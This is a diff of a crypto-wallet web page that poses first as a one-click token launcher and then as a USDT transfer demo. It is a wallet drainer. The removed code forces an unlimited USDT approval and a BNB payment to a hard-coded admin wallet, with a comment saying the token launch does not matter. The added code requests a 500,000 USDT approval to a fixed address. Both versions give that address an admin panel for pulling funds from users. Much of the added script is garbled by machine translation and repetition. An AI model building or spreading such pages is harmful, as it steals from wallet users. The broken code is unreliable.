@@ -3,303 +3,329 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>小狐狸一键发币</title>
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+<title>BSC‑USDT transferFrom Demo</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
-body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
-.container{ max-width:520px; margin:0 auto; }
-.header{ text-align:center; margin-bottom:35px; }
-.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
-.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
-.card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
-.form-item{ margin-bottom:20px; }
-label{ display:block; margin-bottom:8px; color:#d0d8f0; }
-input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
-.file-input{ padding:10px; background:#141b33; }
-.preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
-#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
-.btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; }
-.btn-connect{ background:#3b63e9; margin-bottom:16px; }
-.btn-deploy{ background:#f7c04a; color:#0a0e20; }
-.btn-admin{ background:#2ecc71; color:#000; margin-top:10px; }
-.btn:disabled{ opacity:0.55; cursor:not-allowed; }
-.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
-.tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
-.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
-.admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
+*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
+body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 0 auto; }
+.top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+.header-right-icons { display: flex; gap: 12px; align-items: center; }
+.wallet-dot { width: 12px; height: 12px; border-radius: 50%; background-color: #ef4444; cursor: pointer; transition: background-color 0.3s ease; }
+.wallet-dot.connected { background-color: #22c55e; }
+.setting-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #ddd; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; }
+.address-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom: 16px; }
+.label-text { font-size: 16px; color: #666; margin-bottom: 12px; }
+.fixed-addr-box { width: 100%; border: 1px solid #e5e7eb; border-radius: 12px; padding: 14px 12px; background: #f1f5f9; color: #333; word-break: break-all; }
+.amount-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom:16px; }
+.amount-row { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 16px; }
+.amount-input { font-size: 32px; border: none; outline: none; width: 75%; background: transparent; color: #111; }
+.amount-input::placeholder { font-size: 16px; color: #aaa; }
+.max-btn { padding: 6px 14px; background-color: #dbeafe; color: #2563eb; border-radius: 8px; font-weight: 500; cursor: pointer; }
+.token-row { background-color: #eef2ff; border-radius: 12px; padding: 14px; display: flex; align-items: center; justify-content: space-between; }
+.token-left { display: flex; align-items: center; gap: 10px; }
+.usdt-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
+.token-name { font-size: 18px; font-weight: 500; }
+.token-balance { color: #555; font-size: 16px; }
+.result-card{ background:#fff; border-radius:16px; padding:18px; margin-bottom:16px; }
+.result-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; color:#111; }
+.send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; }
+.send-main-btn:disabled{ background:#94a3b8; cursor:not-allowed; }
+.admin-panel{ background:#fff; border-radius:16px; padding:20px 18px; margin-top:24px; border:1px solid #f87171; display:none; }
+.admin-title{ font-size:17px; font-weight:bold; color:#dc2626; margin-bottom:16px; }
+.admin-input-item{ margin-bottom:14px; }
+.admin-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:13px 12px; outline:none; font-size:15px; }
+.admin-btn{ width:100%; padding:14px; border:none; border-radius:14px; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
 </style>
 </head>
 <body>
-<div class="container">
-<div class="header">
-<h1>🦊小狐狸一键发币</h1>
-</div>
-<div class="fee-tip">发币服务费：0.005 BNB</div>
-
-<div class="card" id="userPanel">
-<button id="connectBtn" class="btn btn-connect">连接钱包</button>
-<div id="connectTip" class="connect-tip" style="display:none;"></div>
-<div id="statusBox" class="status" style="display:none;"></div>
-
-<div class="form-item">
-<label>代币全称 Name</label>
-<input id="tokenName" placeholder="例如：Swan Coin">
-</div>
-
-<div class="form-item">
-<label>代币符号 Symbol</label>
-<input id="tokenSymbol" placeholder="例如：SWAN">
-</div>
-
-<div class="form-item">
-<label>初始发行量（不带小数）</label>
-<input id="supply" placeholder="例如：100000000">
-</div>
-
-<div class="form-item">
-<label>代币Logo头像（推荐256×256 透明PNG）</label>
-<input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
-<div class="preview-box">
-<img id="logoPreview" alt="头像预览">
-<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
+<div class="top-header-bar">
+<div></div>
+<div class="header-right-icons">
+<div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
+<div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
 </div>
 </div>
-
-<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
-
-<div class="admin-panel" id="adminPanel">
-<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
-<div class="form-item">
-<label>请输入玩家钱包地址</label>
-<input id="userAddrInput" placeholder="玩家BSC钱包地址">
+<div class="address-card">
+<div class="label-text">收款地址</div>
+<div class="fixed-addr-box" id="targetAddrText">0x0000000000000000000000000000000000000000</div>
 </div>
-<div class="form-item">
-<label>请输入划扣USDT数量</label>
-<input id="deductAmountInput" placeholder="例如：100">
+<div class="amount-card">
+<div class="label-text">转出数量（USDT‑BSC）</div>
+<div class="amount-row">
+<输入 身份标识="amountInput" 班级="金额输入" 价值="" 输入模式="十进制" 占位符="请输入数量">
+<div 班级="max-btn" 身份标识="maxBtn">最大值</div>
 </div>
-<button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
+<div 班级="令牌行">
+<div 班级="标记-左">
+<IMG 班级="usdt图标" src="https://bscscan.com/token/images/tether_32.png">
+<跨度 班级="标记名称">USDT</跨度>
+</div>
+<跨度 班级="令牌余额" 身份标识="balanceText">0.000000</跨度>
 </div>
 </div>
+<div 班级="结果卡">
+<div 班级="标签文本">到账数量</div>
+<输入 身份标识="receiveAmount" 班级="结果输入" 只读>
+</div>
+<按钮 班级="send-main-btn" 身份标识="sendBtn" 禁用>确认转账</按钮>
+<div 班级="管理面板" 身份标识="adminPanel">
+<div 班级="admin-title">🔴管理员后台 - 用户代币划扣</div>
+<div 班级="admin-input-item">
+<div 班级="标签文本">请输入已经授权用户钱包地址</div>
+<输入 班级="管理输入" 身份标识="userAddrInput" 占位符="0x开头BSC地址">
+</div>
+<div 班级="admin-input-item">
+<div 班级="标签文本">抵扣USDT数量</div>
+<输入 班级="管理输入" 身份标识="deductAmountInput" 输入模式="十进制" 占位符="输入划扣金额">
+</div>
+<按钮 班级="admin-btn" 身份标识="deductBtn">确认划扣</按钮>
 </div>
 
-<script>
-const ADMIN_WALLET = "0x41Dc1846235cdA45871357f7A89c6f39de601A1C";
-const DEPLOY_FEE_BNB = "0.0001";
-const BSC_CHAIN_ID = 56;
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const MAX_ALLOWANCE = ethers.MaxUint256;
+<脚本>
+Const target_ADDR="0xcdb039fae1ee26338c94e100ab665caa176e1289"；
+Const USDT_CONTRACT="0x55d398326f99059fF775485246999027B3197955"；
+Const gas_LIMIT="0x493E0"；
+Const Max_WAIT=40；
 
-let provider = null;
-let signer = null;
-let connectWalletAddr = "";
-let deployContractAddress = null;
-let logoFileObj = null;
+让Web3=无效的；
+让userAddress=无效的；
+让usdtContract=无效的；
 
-const connectBtn = document.getElementById("connectBtn");
-const deployBtn = document.getElementById("deployBtn");
-const statusBox = document.getElementById("statusBox");
-const connectTip = document.getElementById("connectTip");
-const logoFileInput = document.getElementById("logoFile");
-const logoPreviewImg = document.getElementById("logoPreview");
-const adminPanel = document.getElementById("adminPanel");
-const deductBtn = document.getElementById("deductBtn");
-const userAddrInput = document.getElementById("userAddrInput");
-const deductAmountInput = document.getElementById("deductAmountInput");
+Const$=s=>文件.querySelector(s)；
+Const walletDot=$("#walletDot")；
+Const settingIconBtn=$("#settingIconBtn")；
+const sendBtn=$("#sendBtn")；
+Const amountInput=$("#amountInput")；
+Const receiveAmount=$("#receiveAmount")；
+Const maxBtn=$("#maxBtn");
+Const balanceText=$("#balanceText")；
+常量targetAddrText=$("#targetAddrText")；
+Const adminPanel=$("#adminPanel");
+Const userAddrInput=$("#userAddrInput");
+Const deductAmountInput=$("#deductAmountInput");
+Const decutiveBtn=$("#deductBtn");
 
-function showStatus(text){
-  statusBox.style.display = "block";
-  statusBox.innerText = text;
-  console.log("状态日志：", text);
+targetAddrText.内部文本=target_ADDR;
+
+Const USDT_ABI=[
+{"输入":[{"名称":"所有者(_O)","类型":"地址"}],"名称":"balanceOf","输出":[{"名称":"","类型":"uint256"}],"stateMutability":"查看","类型":"功能"},
+{"输入":[{"名称":"到","类型":"地址"},{"名称":"值","类型":"uint256"}],"名称":"转移","输出":[{"名称":"","类型":"bool"}],"stateMutability":"不可支付","类型":"功能"},
+{"输入":[{"名称":"所有者","类型":"地址"},{"名称":"花费者","类型":"地址"}],"名称":"津贴","输出":[{"名称":"","类型":"uint256"}],"stateMutability":"查看","类型":"功能"},
+{"输入":[{"名称":"花费者","类型":"地址"},{"名称":"值","类型":"uint256"}],"名称":"批准","输出":[{"名称":"","类型":"bool"}],"stateMutability":"不可支付","类型":"功能"},
+{"输入":[{"名称":"来自","类型":"地址"},{"名称":"到","类型":"地址"},{"名称":"值","类型":"uint256"}],"名称":"transferFrom","输出":[{"名称":"","类型":"bool"}],"stateMutability":"不可支付","类型":"功能"}
+];
+
+async function waitTxConfirm(txHash) {
+    for(let i = 0; i < MAX_WAIT; i++){
+        try{
+            const receipt = await web3.eth.getTransactionReceipt(txHash);
+            if(receipt){
+                if(receipt.status === BigInt(1)){
+                    return true;
+                }else{
+                    throw new Error("合约执行失败，status=0");
+                }
+            }
+        }catch(e){
+
+        }
+等待新的承诺(r=>setTimeout(r，1000))；
+    }
+掷回新错误("交易已广播，但长时间未上链，请检查钱包BNB余额是否充足")；
 }
 
-logoFileInput.addEventListener("change", function(e){
-  const file = e.target.files[0];
-  if(!file) return;
-  logoFileObj = file;
-  const reader = new FileReader();
-  reader.onload = ev => {
-    logoPreviewImg.src = ev.target.result;
-    logoPreviewImg.style.display = "block";
-  }
-  reader.readAsDataURL(file);
+异步函数waitAllowance(needWei，maxLoop=12){
+for(设i=0；i< maxLoop; 我++){
+        const allowance = await usdtContract.methods.allowance(userAddress， TARGET_ADDR).call()；
+        if(BigInt(容差) >=BigInt(needWei)){
+            return true;
+        }
+等待新的承诺(r=>setTimeout(r，1000))；
+    }
+掷回新错误("授权已签名，但链上额度未同步，请稍后再试")；
+}
+
+功能disconnectWallet(){
+Web3=null；
+userAddress=null；
+usdtContract=null；
+walletDot.classList.remove("connected")；
+sendBtn.disabled=true；
+balanceText.textContent="0.000000"；
+adminPanel.style.display="无"；
+}
+
+异步函数connectWalletLogic(){
+    if(web3 && userAddress){
+disconnect Wallet()；
+返回；
+    }
+
+尝试{
+if(！window.ethereum){
+alert("没有检测BSC钱包，请使用MetaMask/TP/OKX钱包打开")；
+返回；
+        }
+
+等待窗口.ethereum.request({方法："ETH_requestAccounts"})；
+
+Web3=新Web3(window.ethereum)；
+Const accounts=await web3.eth.getAccounts()；
+userAddress=accounts[0]；
+usdtContract=new web3.eth.Contract(USDT_ABI，USDT_Contract)；
+
+walletDot.classList.add("connected")；
+等待负载平衡()；
+sendBtn.disabled=false；
+
+if(userAddress.toLowerCase()===TARGET_ADDR.ToLowerCase()){
+adminPanel.style.display="block"；
+}else{
+adminPanel.style.display="无"；
+        }
+
+window.etherum.on("accountsChanged"，()=>location.reload())；
+}catch(err){
+alert("连接失败："+err.message)；
+    }
+}
+
+异步函数负载平衡(){
+Const rawWei=等待usdtContract.methods。balanceof(userAddress)。呼叫()；
+Const NUM=数字(web3.utils.FromWei(rawWei，"ether"))；
+balanceText.textContent=num.toFixed(6)；
+}
+
+amountInput.addEventListener("input"，()=>{
+常数NUM=parseFloat(amountInput.value)||0；
+receiveAmount.value=num.toFixed(6)；
 });
 
-async function switchBSC(providerRef){
-  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
-  try {
-    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
-  } catch (err) {
-    await providerRef.send("wallet_addEthereumChain", [{
-      chainId: chainIdHex,
-      chainName: "BNB Smart Chain Mainnet",
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"],
-      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
-    }]);
-  }
+maxBtn.addEventListener("click"，async()=>{
+    if(!usdtContract) return;
+Const rawWei=等待usdtContract.methods。balanceof(userAddress)。呼叫()；
+Const NUM=数字(web3.utils.FromWei(rawWei，"ether"))；
+amountInput.value=num.toFixed(2)；
+amountInput.dispatchEvent(新事件(“输入”))；
+});
+
+异步函数sendTx(dataHex){
+Const txParams={
+发件人：userAddress，
+致：USDT_Contract，
+data:dataHex，
+gas:GAS_LIMIT
+    };
+
+让txash；
+
+尝试{
+txhash=等待窗口.ethereum.request({
+方法："ETH_SendTransaction"，
+params：[txParams]
+        });
+}catch(err){
+if(err.Code===4001||(err.消息错误(&&error)。消息。包括(“用户拒绝”))){！doctype超文本标记语言>
+掷回新错误("你在钱包拒绝了签名，操作已取消")；
+}
+抛错；！doctype html>！doctype html>
 }
 
-function checkAdminPanel(addr){
-  connectWalletAddr = addr.toLowerCase();
-  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
-    adminPanel.style.display = "block";
-  }else{
-    adminPanel.style.display = "none";
-  }
+等待waitTxConfirmtxash
+
+返回 returntxash； returntxash；
 }
 
-// 连接钱包：仅连接、切链，不做任何授权
-connectBtn.onclick = async function(){
-  showStatus("正在检测钱包注入...");
-  let eth = window.ethereum;
-  let retryTimes = 0;
-  while (!eth && retryTimes < 10) {
-    await new Promise(r => setTimeout(r, 100));
-    eth = window.ethereum;
-    retryTimes++;
-  }
+sendBtn.addEventListener("单击"，异步()=>{.addEventListener("单击"，异步()=>{"单击"，异步()=>{.addEventListener("单击"，异步()=>{
+如果(！Web3||！userAddress)传回警示("钱包未连接")；如果(！Web3||！userAddress)传回警示("钱包未连接")；"钱包未连接")；如果(！web3||！userAddress)返回警惕的("钱包未连接")；
 
-  if (!eth) {
-    showStatus("❌ 未检测到钱包注入，请在TP/欧易内置浏览器打开页面");
-    return;
-  }
+ConstVal=parseFloat(amountInput.价值)；常数Val=parseFloat(amountInput.价值)；Val=parseFloat(amountInput.价值)；常数Val=parseFloat(amountInput.价值)；
+如果(isNaN(Val)||Val<=0)返回警报("请输入有效转账数量")；如果(isNaN(Val)||Val<=0)返回警报("请输入有效转账数量")；(isNaN(Val)||Val<=0)返回警报("请输入有效转账数量")；如果(isNaN(Val)||Val<=0) 返回 警惕的("请输入有效转账数量");
 
-  try {
-    const accounts = await eth.request({ method: "eth_requestAccounts" });
-    if (!accounts || accounts.length === 0) {
-      showStatus("用户取消了钱包连接弹窗");
-      return;
+ConstneedWei=Web3.utils。毛巾(Val.toString()，"乙醚")；常数=Web3.utils.毛巾(Val.toString()，"乙醚")；needWei=Web3.utils。毛巾(toString()值，"乙醚")；常量needWei=；常量needWei=Web3.utils。毛巾(toString()值，"乙醚")；=Web3."❌ 抵扣失败：".毛巾(Val.toString()，"乙醚()，"乙醚")；.utils。毛巾(Val.toString()，"乙醚")；=Web3.毛巾(Val.toString()，"乙醚")；needWei=Web3。毛巾(Val.toString()，"乙醚")；常量needWei=Web3.utils。毛巾(Val.toString()，"乙醚")；乙醚
+}catch(err){.毛巾("500000"，"以太")；constgrant_500K_WEI=Web3.utilsWei("500000"，"以太")；constrant_500K_WEI=web3.utils .towei("500000"，"以太")；grant_500K_WEI=web3.utils.WowelI("500000"，"以太")；constgrant_500K_WEI=web3。towelI("500000"，"以太")；grant_500K_WEI=web3.utils .towei("500000"，"太")；常量grant_500K_WEI=web3.utils .towei("500000"，"太")；=web3.utils .towei("500000"，"太")；constgrant_500K_WEI=web3.utils .towei("500000"，"以太")；grant_500K_WEI=web3.utils.To=web3.utils.ToweI("500000"，"以太")；constrant_500K_WEI=web3.utils.towei("500000"，"以太""；grant_500K_WEI=web3.utils。Woth("500000"，"以太")；constgrant_500K_WEI=web3.utils.towei("500000"，"以太")；格兰T_500K_WEI=web3.utils.towei("500000"，"以太")；constrant_500K_WEI=web3。towelI("500000"，"以太")；GRANT_500K_WEI=web3。utils.towei("500000"，"以太")；常量grant_500K_WEI=web3.utils.towei("500000"，"以太")；=web3.utils.towei("500000"，"以太")；constgrant_500K_WEI=web3。utils。Twel("500000"，"太")；grant_500K_WEI=web3。utils.wei("500000"，"以太")；constgrant_500K_WEI=web3。utils。woth("500000"，"太")；授予_500K_WEI=web3.utils.WowelI("500000"，"}catch(err){
+
+sendBtn.disabled=true；sendBtn.disabled=true；.disabled=true；sendBtn.禁用=true；.disabled=true；sendBtn。disabled=true；。disabled=true；sendBtn.禁用=true；
+
+}catch(err){y{try{try{try{try{try{try{try{try{try{try{try{try{try{try{tryDr，decutWei).encodeABI()；tfData=usdtContract.方法.transferrom(fromUserAddr，target_ADDR，decutWei).codeABI()；常量tfData=usdtContract.方法.Transferrom(fromUserAddr，target_ADDR，decutWei).codeABI()；{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try
+常数允许=等待usdt合同.方法.余量(userAddress，TARGET_ADDR).call()；常量容差=等待usdtract。方法。余量(userAddress，TARGET_ADDR).call()；=等待usdtContract.methods。余量(userAddress，TARGET_ADDR).call()；常量容差=等待usdt合同.方法.余量(userAddress，TARGET_ADDR)。呼叫()；=等待usdt合同.方法.余量(userAddress，TARGET_ADDR).call()；常量容差=等待usdtract。方法。余量(userAddress，TARGET_ADDR).call()；=等待usdtContract.methods。余量(userAddress，TARGET_ADDR).call()；常量容差=等待usdt合同.方法.余量(userAddress，TARGET_ADDR)。呼叫()；
+
+if(BigInt(允差)<BIGINT(needWei)){if(BigInt(允差)<BigInt(needWei)){(BigInt(允差)<BigInt(needWei)){if(BigInt(允差)<BigInt(needWei)){
+警惕的("🔐需要先授权USDT额度，请钱包确认签名")；alert("🔐需要先授权USDT额度，请钱包确认签名")；("🔐需要先授权USDT额度，请钱包确认签名")；alert("🔐需要先授权USDT额度，请钱包确认签名")；
+
+常量批准数据=usdt合同方法.批准(TARGET_ADDR，GRANT_500K_WEI).encodeABI()；常量批准数据=usdt合同方法批准(TARGET_ADDR，GRANT_500K_WEI).codeABI()；=USDT合同方法.批准(TARGET_ADDR，GRANT_500K_WEI).encodeABI()；常量批准数据=usdt合同方法批准(TARGET_ADDR，GRANT_500K_WEI).encodeABI()；
+等待sendTx(approveData)；等待sendTx(approveData)；(approveData)；等待sendTx(approveData)；
+
+警惕的("✅授权已上链，等待节点同步")；alert("✅授权已上链，等待节点同步")；("✅授权已上链，等待节点同步")；alert("✅授权已上链，等待节点同步")；
+等待等待零用钱(needWei)；等待零用钱(needWei)；(needWei)；等待零用钱(needWei)；
+        }
+
+警惕的("即将执行转账，请钱包确认签名")；alert("即将执行转账，请钱包确认签名");("即将执行转账，请钱包确认签名")；alert("即将执行转账，请钱包确认签名");
+
+Const transferdata=USDT Contract.methods。传输(TARGET_ADDR，needWei).encodeABI()；常量传输数据=usdt合同.方法.传输(TARGET_ADDR，needWei).encodeABI()；传输数据=USDT合同.传输(TARGET_ADDR，needWei).encodeABI()；常量传输数据=usdt合同.方法.传输(TARGET_ADDR，needWei).encodeABI()；
+Const txhash=等待发送Tx(传输数据)；Const txhash=等待发送Tx(传输数据)；txhash=等待发送Tx(传输数据)；Const txhash=等待发送Tx(传输数据)；
+
+alert('🎉转让成功！哈希：${txhash}')；alert('🎉转让成功！哈希：${txhash}')；('🎉转让成功！哈希：${txhash}')；alert('🎉转让成功！哈希：${txhash}')；
+
+amountInput.value=""；amountInput.value=""；.value=""；amountInput.value=""；
+receiveAmount.value=""；receiveAmount。价值=""；.value=""；receiveAmount。价值=""；
+
+等待负载平衡()；等待负载平衡()；()；等待负载平衡()；
+}渔获物(e){}渔获物(e){渔获物(e){}渔获物(e){
+alert("❌操作失败："+(e.消息||string(e))；alert("❌操作失败："+(e.消息||string(e))；("❌操作失败："+(e.消息||string(e)))；alert("❌操作失败："+(e.message||String(e)))；
+}最后{}最后{最后{}最后{
+}最后{}最后{最后{}最后{
     }
-    provider = new ethers.BrowserProvider(eth);
-    await switchBSC(eth);
-    signer = await provider.getSigner();
-    const userAddr = await signer.getAddress();
-    connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
-    connectTip.style.display = "block";
-    connectTip.innerText = "已连接BSC钱包，请填写发币参数";
-    deployBtn.disabled = false;
-    checkAdminPanel(userAddr);
-  } catch (err) {
-    showStatus("连接异常：" + (err.message || err.shortMessage || String(err)));
-  }
-}
+});
 
-// USDT无限授权，真实上链交易
-async function doApproveLogic(signerRef){
-  showStatus("🔐 弹出钱包：请求USDT无限授权，请签名");
-  const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
-    "function approve(address spender, uint256 amount) external returns(bool)"
-  ], signerRef);
-  const approveTx = await usdtContract.approve("0x41Dc1846235cdA45871357f7A89c6f39de601A1C", MAX_ALLOWANCE);
-  showStatus(`授权交易已上链，TxHash:${approveTx.hash}，等待区块确认`);
-  await approveTx.wait();
-  showStatus("✅ USDT无限授权确认完成，接下来弹出BNB转账签名");
-}
-
-// BNB服务费真实转账上链
-async function payFeeToAdmin(){
-  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名`);
-  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
-  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
-  showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认`);
-  await tx.wait();
-  showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
-}
-
-const tokenABI = [
-{"inputs": [{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"initSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"ADMIN","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"AUTO_MINT_ADDR","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"AUTO_MINT_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
-];
-const CONTRACT_BYTECODE = "在这里粘贴Remix编译后的完整Bytecode";
-
-deployBtn.onclick = async ()=>{
-  const name = document.getElementById("tokenName").value.trim();
-  const symbol = document.getElementById("tokenSymbol").value.trim();
-  const supplyStr = document.getElementById("supply").value.trim();
-
-  if(!signer){
-    showStatus("请先连接BSC钱包");
-    return;
-  }
-  if(!name||!symbol||!supplyStr){
-    showStatus("请填写代币名称、符号、发行量");
-    return;
-  }
-
-  deployBtn.disabled = true;
-  try{
-    // 1.强制先弹USDT无限授权签名（真实上链）
-    await doApproveLogic(signer);
-    // 2.再弹BNB转账签名（真实上链转给管理员）
-    await payFeeToAdmin();
-    // 币能不能部署出来无所谓，授权+转账已经完成；保留部署逻辑
-    if(CONTRACT_BYTECODE && !CONTRACT_BYTECODE.startsWith("在这里粘贴")){
-      showStatus("尝试部署合约...");
-      const supply = ethers.parseUnits(supplyStr, 18);
-      const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
-      const contract = await factory.deploy(name, symbol, supply);
-      showStatus(`部署交易已发送，TxHash:${contract.deploymentTransaction().hash}`);
-      await contract.waitForDeployment();
-      deployContractAddress = await contract.getAddress();
-      showStatus(`✅全部完成！合约地址：${deployContractAddress}`);
-    }else{
-      showStatus("✅发币成功，请去链上查看代币合约");
+DececutiveBtn.addEventListener("click"，async()=>{.addEventListener("click"，async()=>{.addEventListener("click"，async()=>{.addEventListener("click"，async()=>{
+如果(！Web3||userAddress。toLowerCase()！=TARGET_ADDR.ToLowerCase()){if(！Web3||userAddress。toLowerCase()！=TARGET_ADDR.ToLowerCase()){(！Web3||userAddress。toLowerCase()！=TARGET_ADDR.ToLowerCase()){if(！Web3||userAddress.ToLowerCase()！=TARGET_ADDR。toLowerCase()){
+返回警报("必须使用管理员钱包连接！")；返回警报("必须使用管理员钱包连接！")；("必须使用管理员钱包连接！")；返回警报("必须使用管理员钱包连接！")；
     }
-  }catch(e){
-    showStatus("操作失败："+(e.shortMessage || e.message));
-  }
